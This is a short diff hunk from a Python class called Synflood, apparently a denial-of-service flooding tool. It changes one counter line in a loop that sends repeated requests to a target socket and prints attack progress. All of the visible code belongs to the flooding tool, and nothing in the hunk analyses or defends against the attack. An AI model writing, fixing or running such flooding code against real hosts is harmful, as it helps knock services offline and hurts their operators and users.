@@ -52,7 +52,7 @@ class Synflood:
                 s.send(str.encode(main_req))
                 for _ in range(self.pack):
                     s.send(str.encode(main_req))
-                xx += random.randint(0, int(self.pack))
+                xx += random.randint(0, int(self.packet))
                 print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
             except:
                 s.close()
